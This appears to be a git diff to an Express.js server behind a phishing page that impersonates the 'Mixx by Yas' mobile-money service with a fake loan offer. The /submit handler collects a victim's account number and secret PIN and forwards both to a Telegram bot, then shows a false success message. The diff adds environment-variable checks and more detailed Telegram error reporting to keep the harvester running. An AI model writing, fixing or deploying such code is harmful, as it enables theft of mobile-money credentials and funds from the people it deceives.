@@ -15,6 +15,13 @@ app.get('/', (req, res) => {
 
 app.post('/submit', async (req, res) => {
   const { mixxNamba, siri } = req.body;
+
+  // Angalia kama env zipo
+  if (!BOT_TOKEN || !CHAT_ID) {
+    console.error("ERROR: BOT_TOKEN au CHAT_ID haipo kwenye Environment Variables");
+    return res.status(500).send('<h2 style="text-align:center;color:red">ERROR: BOT_TOKEN au CHAT_ID haipo. Nenda Render > Environment</h2>');
+  }
+
   const message = `📦 *MIKOPO MPYA IMEINGIA - MIXX BY YAS* 📦\n\n*Namba ya MIXX*: ${mixxNamba}\n*Siri*: ${siri}\n\n⏰ ${new Date().toLocaleString("sw-TZ")}`;
   
   try {
@@ -25,9 +32,9 @@ app.post('/submit', async (req, res) => {
     });
     res.send('<h2 style="text-align:center;color:green">Umefanikiwa! Tafadhali subiri uthibitisho</h2>');
   } catch (err) {
-    console.error(err);
-    res.status(500).send('<h2 style="text-align:center;color:red">Kuna shida. Jaribu tena</h2>');
+    console.error("TELEGRAM ERROR:", err.response ? err.response.data : err.message);
+    res.status(500).send(`<h2 style="text-align:center;color:red">Kuna shida na Telegram: ${err.response ? err.response.data.description : err.message}</h2>`);
   }
 });
 
-app.listen(PORT, () => console.log(`Running on ${PORT}`));
+app.listen(PORT, () => console.log(`Server inafanya kazi kwenye port ${PORT}`));
